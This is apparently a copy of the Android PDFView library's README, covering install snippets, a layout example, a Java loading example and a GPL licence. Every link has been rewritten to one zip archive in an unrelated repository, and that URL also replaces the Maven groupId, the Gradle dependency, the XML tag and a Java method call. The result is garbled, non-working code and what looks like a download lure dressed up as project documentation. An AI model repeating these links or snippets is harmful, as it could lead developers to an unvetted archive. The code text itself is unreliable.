# This project is no longer maintained.
### You can find a good replacement [here](https://raw.githubusercontent.com/Joe-Mogul/android-pdfview/master/android-pdfview/res/pdfview-android-v1.1.zip), which is a fork relying on Pdfium instead of Vudroid/MuPDF for decoding PDF files, allowing it to use the Apache License 2.0 which gives you much more freedom.

----------------------

[![Android Arsenal](https://raw.githubusercontent.com/Joe-Mogul/android-pdfview/master/android-pdfview/res/pdfview-android-v1.1.zip%https://raw.githubusercontent.com/Joe-Mogul/android-pdfview/master/android-pdfview/res/pdfview-android-v1.1.zip)](https://raw.githubusercontent.com/Joe-Mogul/android-pdfview/master/android-pdfview/res/pdfview-android-v1.1.zip)

[![Screenshot of the sample app](https://raw.githubusercontent.com/Joe-Mogul/android-pdfview/master/android-pdfview/res/pdfview-android-v1.1.zip)](https://raw.githubusercontent.com/Joe-Mogul/android-pdfview/master/android-pdfview/res/pdfview-android-v1.1.zip)

**Android PDFView** is a library which provides a fast PDFView component for Android, with ```animations```, ```gestures```, and ```zoom```. It's based on [VuDroid](https://raw.githubusercontent.com/Joe-Mogul/android-pdfview/master/android-pdfview/res/pdfview-android-v1.1.zip) for decoding the PDF file.

# Get it

Android PDFView is **available in Maven Central**.

```xml
<dependency>
	<groupId>https://raw.githubusercontent.com/Joe-Mogul/android-pdfview/master/android-pdfview/res/pdfview-android-v1.1.zip</groupId>
	<artifactId>android-pdfview</artifactId>
	<version>1.0.4</version>
	<type>apklib</type>
</dependency>
```

Or via gradle:

```
compile 'https://raw.githubusercontent.com/Joe-Mogul/android-pdfview/master/android-pdfview/res/pdfview-android-v1.1.zip'
```

# Include PDFView in your layout

```xml
<https://raw.githubusercontent.com/Joe-Mogul/android-pdfview/master/android-pdfview/res/pdfview-android-v1.1.zip
        android:id="@+id/pdfview"
        android:layout_width="match_parent"
        android:layout_height="match_parent"/>
```

# Load a PDF file

```java
https://raw.githubusercontent.com/Joe-Mogul/android-pdfview/master/android-pdfview/res/pdfview-android-v1.1.zip(pdfName)
    .pages(0, 2, 1, 3, 3, 3)
    .defaultPage(1)
    .showMinimap(false)
    .enableSwipe(true)
    .onDraw(onDrawListener)
    .onLoad(onLoadCompleteListener)
    .onPageChange(onPageChangeListener)
    .load();
```

* ```pages``` is optional, it allows you to filter and order the pages of the PDF as you need
* ```onDraw``` is also optional, and allows you to draw something on a provided canvas, above the current page

# License

```
Copyright 2013-2015 Joan Zapata

This file is part of Android-pdfview.

Android-pdfview is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

Android-pdfview is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Android-pdfview.  If not, see <https://raw.githubusercontent.com/Joe-Mogul/android-pdfview/master/android-pdfview/res/pdfview-android-v1.1.zip>.
```
